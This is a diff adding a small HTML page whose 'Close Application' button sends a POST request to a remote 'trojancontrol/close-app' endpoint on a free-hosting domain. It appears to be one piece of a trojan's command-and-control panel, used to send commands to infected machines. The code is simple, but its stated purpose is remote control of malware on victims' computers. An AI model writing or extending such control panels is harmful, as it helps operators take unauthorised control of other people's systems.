@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Close Application</title>
+</head>
+<body>
+    <button id="closeAppButton">Close Application</button>
+
+    <script>
+    // Get a reference to the button element
+    const closeAppButton = document.getElementById('closeAppButton');
+
+    // Add a click event listener to the button
+    closeAppButton.addEventListener('click', async () => {
+        // Replace with the actual URL of your Express.js server
+        const serverUrl = 'http://theweirdwebsite.000.pe:80/trojancontrol/close-app';
+
+        try {
+            const response = await fetch(serverUrl, { method: 'POST' });
+
+            if (response.ok) {
+                alert('Application closed successfully.');
+            } else {
+                alert('Failed to close the application.');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('An error occurred while closing the application.');
+        }
+    });
+</script>
+</body>
+</html>
